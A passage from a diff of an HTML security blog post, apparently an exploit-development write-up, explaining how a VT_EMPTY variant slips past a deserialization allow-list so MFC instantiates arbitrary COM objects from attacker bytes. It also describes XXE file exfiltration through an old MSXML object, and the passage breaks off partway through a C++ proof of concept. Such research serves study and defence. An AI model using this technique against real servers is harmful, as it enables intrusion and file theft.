+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="p">..;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">Size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VariantTypeToSize</span><span class="p">(</span><span class="n">VarType</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Size</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">Variant</span><span class="o">-&gt;</span><span class="n">vt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VarType</span><span class="p">;</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">Archive</span><span class="p">.</span><span class="n">ReadInto</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Variant</span><span class="o">-&gt;</span><span class="n">decVal</span><span class="mf">.8</span><span class="p">,</span><span class="w"> </span><span class="n">Size</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">CheckVariantType</span><span class="p">(</span><span class="n">VarType</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="c1">// ...</span>
+<span class="w">      </span><span class="k">throw</span><span class="w"> </span><span class="n">Something</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">Archive</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">Variant</span><span class="p">;</span><span class="w"> </span><span class="c1">// operator&gt;&gt; is imported from MFC</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>The <code>Archive&gt;&gt;Variant</code> statement is the one that directly calls into an export from the MFC. The mistake I made is to precisely ignore that calls into another module. A good but obvious lesson is that hitr was not to ignore points in the code where the application logic bridges interact with another module. Those points are pretty crucial into a program as the callers might make wrong assumptions about how the library (third party or not) might be working which could lead to interesting behaviors that we can exploit.</p>
+<p>Moving on, the first thing that <code>ReadVariant_</code> does it to read the integer that tells you what the variant is holding. If the variant holds an array, then it goes into another function. The <code>VariantTypeToSize</code> function is a simple function that returns the amount of bytes to read based on the type of the variant:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">size_t</span><span class="w"> </span><span class="nf">VariantTypeToSize</span><span class="p">(</span><span class="n">VARTYPE</span><span class="w"> </span><span class="n">VarType</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">switch</span><span class="p">(</span><span class="n">VarType</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_I1</span><span class="p">:</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_UI2</span><span class="p">:</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_UI4</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_INT</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_UINT</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_HRESULT</span><span class="p">:</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_I8</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_UI8</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_FILETIME</span><span class="p">:</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">8</span><span class="p">;</span>
+<span class="w">    </span><span class="k">default</span><span class="o">:</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>It only cared about the variant types that are integers-like (<code>uint8_t</code>, <code>uint16_t</code>, <code>uint32_t</code>, etc.) and returned zero otherwise. If the returned value is not zero, then that amount of bytes was read into the <code>VARIANT</code> content. Makes sense.</p>
+<p>If the type of the variant wasn't one of the integers-like types, then <code>CheckVariantType</code> is used to do one last layer of sanitization:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">bool</span><span class="w"> </span><span class="nf">CheckVariantType</span><span class="p">(</span><span class="n">VARTYPE</span><span class="w"> </span><span class="n">VarType</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="n">VarType</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0x2FFF</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">VarType</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">switch</span><span class="p">(</span><span class="n">VarType</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFFF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_EMPTY</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_NULL</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_I2</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_I4</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_R4</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_R8</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_CY</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_DATE</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_BSTR</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_ERROR</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_BOOL</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_VARIANT</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_I1</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_UI1</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_UI2</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_UI4</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_I8</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_UI8</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_INT</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_UINT</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_HRESULT</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_FILETIME</span><span class="p">:</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
+<span class="w">      </span><span class="k">break</span><span class="p">;</span>
+<span class="w">    </span><span class="k">default</span><span class="o">:</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>This function basically implements an allow list of types it knows how to handle. If the type isn't in the allow list an exception is raised. Looks solid right?</p>
+<p>Well, the first part of the trick is to send a <code>VT_EMPTY</code> variant. If you do that, <code>VariantTypeToSize</code> returns zero and <code>CheckVariantType</code> returns true which leads us right into the deserialization function exported by the MFC. Although it is cool to land in the MFC but how do we go from sending an empty variant to instantiating a COM object? 🤔 The second part of the trick is that the <code>utils::ReadVariant</code> function consumed bytes from the stream to read the type of the variant. But ultimately the <code>operator&gt;&gt;</code> function in the MFC also needs to figure out what the type of the variant is.. do you see where this is going?</p>
+<p>Well, the <code>operator&gt;&gt;</code> reads another two byte as the type of the variant which means that now we are able to pass arbitrary variant types and bypass the allow-list in <code>CheckVariantType</code>. Pretty cool uh?</p>
+<p>As we mentioned earlier, the MFC is a library that Microsoft ships and as a result it has to be documented somehow. After googling around, I found the source-code of this function in my Visual Studio installation (<code>C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\atlmfc\src\mfc\olevar.cpp</code>) and <a href="https://github.com/mirror/winscp/blob/3266c40c2d98ae659b1e8fe32a596697f8bdacf0/libs/mfc/source/olevar.cpp#L779">it looked like this</a>:</p>
+<div class="highlight"><pre><span></span><code><span class="n">CArchive</span><span class="o">&amp;</span><span class="w"> </span><span class="n">AFXAPI</span><span class="w"> </span><span class="k">operator</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="n">CArchive</span><span class="o">&amp;</span><span class="w"> </span><span class="n">ar</span><span class="p">,</span><span class="w"> </span><span class="n">COleVariant</span><span class="o">&amp;</span><span class="w"> </span><span class="n">varSrc</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">LPVARIANT</span><span class="w"> </span><span class="n">pSrc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">varSrc</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ar</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">vt</span><span class="p">;</span>
+
+<span class="c1">// ...</span>
+<span class="w">  </span><span class="k">switch</span><span class="p">(</span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">vt</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="c1">// ...</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_DISPATCH</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_UNKNOWN</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">LPPERSISTSTREAM</span><span class="w"> </span><span class="n">pPersistStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">      </span><span class="n">CArchiveStream</span><span class="w"> </span><span class="nf">stm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ar</span><span class="p">);</span>
+<span class="w">      </span><span class="n">CLSID</span><span class="w"> </span><span class="n">clsid</span><span class="p">;</span>
+<span class="w">      </span><span class="n">ar</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">clsid</span><span class="p">.</span><span class="n">Data1</span><span class="p">;</span>
+<span class="w">      </span><span class="n">ar</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">clsid</span><span class="p">.</span><span class="n">Data2</span><span class="p">;</span>
+<span class="w">      </span><span class="n">ar</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">clsid</span><span class="p">.</span><span class="n">Data3</span><span class="p">;</span>
+<span class="w">      </span><span class="n">ar</span><span class="p">.</span><span class="n">EnsureRead</span><span class="p">(</span><span class="o">&amp;</span><span class="n">clsid</span><span class="p">.</span><span class="n">Data4</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="k">sizeof</span><span class="w"> </span><span class="n">clsid</span><span class="p">.</span><span class="n">Data4</span><span class="p">);</span>
+<span class="w">      </span><span class="n">SCODE</span><span class="w"> </span><span class="n">sc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">clsid</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span>
+<span class="w">        </span><span class="n">CLSCTX_ALL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">CLSCTX_REMOTE_SERVER</span><span class="p">,</span>
+<span class="w">        </span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">vt</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">VT_UNKNOWN</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">IID_IUnknown</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">IID_IDispatch</span><span class="p">,</span>
+<span class="w">        </span><span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">punkVal</span><span class="p">);</span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">sc</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">E_INVALIDARG</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">sc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">clsid</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span>
+<span class="w">          </span><span class="n">CLSCTX_ALL</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">~</span><span class="n">CLSCTX_REMOTE_SERVER</span><span class="p">,</span>
+<span class="w">          </span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">vt</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">VT_UNKNOWN</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">IID_IUnknown</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">IID_IDispatch</span><span class="p">,</span>
+<span class="w">          </span><span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">punkVal</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">      </span><span class="n">AfxCheckError</span><span class="p">(</span><span class="n">sc</span><span class="p">);</span>
+<span class="w">      </span><span class="n">TRY</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">sc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">punkVal</span><span class="o">-&gt;</span><span class="n">QueryInterface</span><span class="p">(</span>
+<span class="w">          </span><span class="n">IID_IPersistStream</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pPersistStream</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">sc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">punkVal</span><span class="o">-&gt;</span><span class="n">QueryInterface</span><span class="p">(</span>
+<span class="w">            </span><span class="n">IID_IPersistStreamInit</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pPersistStream</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">AfxCheckError</span><span class="p">(</span><span class="n">sc</span><span class="p">);</span>
+<span class="w">        </span><span class="n">AfxCheckError</span><span class="p">(</span><span class="n">pPersistStream</span><span class="o">-&gt;</span><span class="n">Load</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stm</span><span class="p">));</span>
+<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="n">CATCH_ALL</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">pPersistStream</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">pPersistStream</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">punkVal</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+<span class="w">        </span><span class="n">THROW_LAST</span><span class="p">();</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">      </span><span class="n">END_CATCH_ALL</span>
+<span class="w">      </span><span class="n">pPersistStream</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ar</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>Indeed, a class ID is read from the archive and an instance of the COM object is instantiated. Although we can instantiate any COM object we would like, if it doesn't implement <a href="https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-ipersiststream">IID_IPersistStream</a> or <a href="https://learn.microsoft.com/en-us/windows/win32/api/ocidl/nn-ocidl-ipersiststreaminit">IID_IPersistStreamInit</a> then the object is released and the function bails.</p>
+<p>If you are not familiar with this interface here's what the MSDN says about it:</p>
+<blockquote>
+<p>Enables the saving and loading of objects that use a simple serial stream for their storage needs.</p>
+</blockquote>
+<p>In a nutshell, if the COM object implements one of those interfaces, it is able to be saved and loaded from a stream of bytes. This means that you can use serialize those objects with <a href="https://learn.microsoft.com/en-us/windows/win32/api/objidl/nf-objidl-ipersiststream-save">Save</a>, send the bytes over a socket, or store it on the filesystem and rehydrate those objects with <a href="https://learn.microsoft.com/en-us/windows/win32/api/objidl/nf-objidl-ipersiststream-load">Load</a>. The other exciting detail is that the stream with our controlled content is the stream the COM object will use to deserialize its state.</p>
+<p>At that point I was over the moon because this seemed like an extremely insecure thing to do and I knew there would be a way to exploit it. I might not find a way in time but I was convinced there was a way.</p>
+<h1 id="exploit-engineering-building-paracosme">Exploit engineering: Building Paracosme</h1>
+<p>At that point, I started writing tooling to enumerate every COM objects on a fresh installed system that implemeneted either of those interfaces and loaded them one by one with a streams full of AAA's just in case I would encounter a low hanging fruit memory corruption. I did find a few memory safety issues that I reported to MSRC as <a href="https://github.com/0vercl0k/CVE-2022-21971">CVE-2022-21971</a> and <a href="https://github.com/0vercl0k/CVE-2022-21974">CVE-2022-21974</a>. It turns out, RTF documents (loadable via Microsoft Word) can embed arbitrary COM class ID that also get instatiated via <code>OleLoad</code> and those issues would trigger right on load which was pretty hilarious.</p>
+<p>But the tooling didn't really help me move the needle much forward. I had this crazy logic security bug but didn't really know what to do with it. I started to move away from tooling and analyzed those objects manually to try to come up with ideas.</p>
+<p>I eventually found something midly interesting though that allowed me to exfiltrate a file on the server via an <a href="https://portswigger.net/web-security/xxe">XXE</a>. This was particularly interesting because it was 100% reliable and only relied on a logic issue. The way I can do that is by loading an older Microsoft XML (the newer version disabled XXEs by default), <code>2933BF90-7B36-11D2-B20E-00C04F983E60</code>, and specify an XML document in the stream and leverage an external entity to exfiltrate the content of an arbitrary file over to a remote HTTP server. Here is a PoC in case this trick is useful to anybody one day:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;cinttypes&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;cstdint&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;optional&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;shlwapi.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unordered_map&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
+<span class="cp">#pragma comment(lib, &quot;shlwapi.lib&quot;)</span>
+
+<span class="n">std</span><span class="o">::</span><span class="n">optional</span><span class="o">&lt;</span><span class="n">GUID</span><span class="o">&gt;</span><span class="w"> </span><span class="n">Guid</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="w"> </span><span class="o">&amp;</span><span class="n">S</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">GUID</span><span class="w"> </span><span class="n">G</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sscanf_s</span><span class="p">(</span><span class="n">S</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span>
+<span class="w">               </span><span class="s">&quot;{%8&quot;</span><span class="w"> </span><span class="n">PRIx32</span><span class="w"> </span><span class="s">&quot;-%4&quot;</span><span class="w"> </span><span class="n">PRIx16</span><span class="w"> </span><span class="s">&quot;-%4&quot;</span><span class="w"> </span><span class="n">PRIx16</span><span class="w"> </span><span class="s">&quot;-%2&quot;</span><span class="w"> </span><span class="n">PRIx8</span><span class="w"> </span><span class="s">&quot;%2&quot;</span><span class="w"> </span><span class="n">PRIx8</span><span class="w"> </span><span class="s">&quot;-&quot;</span>
+<span class="w">               </span><span class="s">&quot;%2&quot;</span><span class="w"> </span><span class="n">PRIx8</span><span class="w"> </span><span class="s">&quot;%2&quot;</span><span class="w"> </span><span class="n">PRIx8</span><span class="w"> </span><span class="s">&quot;%2&quot;</span><span class="w"> </span><span class="n">PRIx8</span><span class="w"> </span><span class="s">&quot;%2&quot;</span><span class="w"> </span><span class="n">PRIx8</span><span class="w"> </span><span class="s">&quot;%2&quot;</span><span class="w"> </span><span class="n">PRIx8</span><span class="w"> </span><span class="s">&quot;%2&quot;</span><span class="w"> </span><span class="n">PRIx8</span>
+<span class="w">               </span><span class="s">&quot;}&quot;</span><span class="p">,</span>
+<span class="w">               </span><span class="o">&amp;</span><span class="n">G</span><span class="p">.</span><span class="n">Data1</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">G</span><span class="p">.</span><span class="n">Data2</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">G</span><span class="p">.</span><span class="n">Data3</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">G</span><span class="p">.</span><span class="n">Data4</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">G</span><span class="p">.</span><span class="n">Data4</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
+<span class="w">               </span><span class="o">&amp;</span><span class="n">G</span><span class="p">.</span><span class="n">Data4</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">G</span><span class="p">.</span><span class="n">Data4</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">G</span><span class="p">.</span><span class="n">Data4</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">G</span><span class="p">.</span><span class="n">Data4</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">G</span><span class="p">.</span><span class="n">Data4</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span>
+<span class="w">               </span><span class="o">&amp;</span><span class="n">G</span><span class="p">.</span><span class="n">Data4</span><span class="p">[</span><span class="mi">7</span><span class="p">])</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">11</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">std</span><span class="o">::</span><span class="n">nullopt</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">G</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="n">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">Key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;{2933BF90-7B36-11D2-B20E-00C04F983E60}&quot;</span><span class="p">;</span>
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="k">auto</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ClassId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Guid</span><span class="p">(</span><span class="n">Key</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">CoInitialize</span><span class="p">(</span><span class="k">nullptr</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">ClassId</span><span class="p">.</span><span class="n">has_value</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Guid failed w/ &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">Key</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">EXIT_FAILURE</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Trying to create %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">Key</span><span class="p">);</span>
+<span class="w">  </span><span class="n">IUnknown</span><span class="w"> </span><span class="o">*</span><span class="n">Unknown</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">nullptr</span><span class="p">;</span>
+<span class="w">  </span><span class="n">HRESULT</span><span class="w"> </span><span class="n">Hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">ClassId</span><span class="p">.</span><span class="n">value</span><span class="p">(),</span><span class="w"> </span><span class="k">nullptr</span><span class="p">,</span><span class="w"> </span><span class="n">CLSCTX_ALL</span><span class="p">,</span>
+<span class="w">                                </span><span class="n">IID_IUnknown</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Unknown</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">Hr</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">Hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">ClassId</span><span class="p">.</span><span class="n">value</span><span class="p">(),</span><span class="w"> </span><span class="k">nullptr</span><span class="p">,</span><span class="w"> </span><span class="n">CLSCTX_ALL</span><span class="p">,</span><span class="w"> </span><span class="n">IID_IDispatch</span><span class="p">,</span>
+<span class="w">                          </span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Unknown</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">Hr</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Failed CoCreateInstance %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">Key</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">EXIT_FAILURE</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">IPersistStream</span><span class="w"> </span><span class="o">*</span><span class="n">PersistStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">nullptr</span><span class="p">;</span>
+<span class="w">  </span><span class="n">Hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Unknown</span><span class="o">-&gt;</span><span class="n">QueryInterface</span><span class="p">(</span><span class="n">IID_IPersistStream</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">PersistStream</span><span class="p">);</span>
+<span class="w">  </span><span class="n">DWORD</span><span class="w"> </span><span class="n">Return</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">;</span>
